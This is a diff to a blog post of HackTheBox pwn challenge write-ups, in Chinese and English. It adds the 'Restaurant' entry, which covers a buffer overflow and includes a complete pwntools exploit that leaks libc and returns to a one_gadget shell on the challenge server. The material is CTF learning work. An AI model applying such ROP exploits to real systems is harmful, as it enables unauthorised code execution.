@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: HackTheBox"
 published: 2025-07-24
-updated: 2025-07-26
+updated: 2025-07-29
 description: "Write-ups for HackTheBox's pwn challenges."
 image: "https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.2rvfoyyezu.avif"
 tags: ["Pwn", "Write-ups"]
@@ -286,6 +286,113 @@ def main():
 
     # raw_input("DEBUG")
     target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Restaurant
+
+## Difficulty
+
+- EASY
+
+## Description
+
+> Welcome to our Restaurant. Here, you can eat and drink as much as you want! Just don't overdo it..
+
+## Write-up
+
+只提供了 libc，为了 patchelf 还得去找对应 `ld`：
+
+```bash collapse={4-27} ins={30}
+λ ~/Projects/pwn/Restaurant/ strings libc.so.6 | grep "GLIBC"
+GLIBC_2.2.5
+GLIBC_2.2.6
+GLIBC_2.3
+GLIBC_2.3.2
+GLIBC_2.3.3
+GLIBC_2.3.4
+GLIBC_2.4
+GLIBC_2.5
+GLIBC_2.6
+GLIBC_2.7
+GLIBC_2.8
+GLIBC_2.9
+GLIBC_2.10
+GLIBC_2.11
+GLIBC_2.12
+GLIBC_2.13
+GLIBC_2.14
+GLIBC_2.15
+GLIBC_2.16
+GLIBC_2.17
+GLIBC_2.18
+GLIBC_2.22
+GLIBC_2.23
+GLIBC_2.24
+GLIBC_2.25
+GLIBC_2.26
+GLIBC_2.27
+GLIBC_PRIVATE
+GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
+```
+
+可以看到使用的是 `GLIBC 2.27`，通过 `glibc-all-in-one` 下载 release 版本的 GLIBC，得到对应 `ld`.
+
+使用以下命令来 patchelf，`--set-rpath .` 是让它在当前目录下自己找 `libc.so.6`，我们只要通过 `--set-interpreter` 设置好动态连接器就行了。
+
+```bash
+sudo patchelf --set-interpreter "$(pwd)/ld-2.27.so" --set-rpath . ./restaurant
+```
+
+这个程序本身没什么复杂的，注意到只有 `fill` 函数里面的一个 `read` 存在 BOF，用它构造 ROP Chain 就好了。先泄漏 libc，然后再返回到 `fill` 二次输入。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import ELF, ROP, args, context, flat, process, raw_input, remote, u64
+
+FILE = "./restaurant"
+HOST, PORT = "94.237.60.55", 54861
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+rop = ROP(elf)
+libc = ELF("./libc.so.6")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    # raw_input("DEBUG")
+    target.sendlineafter(b"> ", str(1))
+
+    payload = flat(
+        b"A" * 0x28, rop.rdi.address, elf.got["puts"], elf.plt["puts"], elf.sym["fill"]
+    )
+    target.sendafter(b"> ", payload)
+
+    target.recvuntil(b"\xa3\x10\x40")
+    libc.address = u64(target.recv(0x6).strip().ljust(8, b"\x00")) - libc.sym["puts"]
+    one_gadget = libc.address + 0x10A41C
+
+    payload = flat(b"A" * 0x28, one_gadget)
+    target.sendafter(b"> ", payload)
+
     target.interactive()
 
 
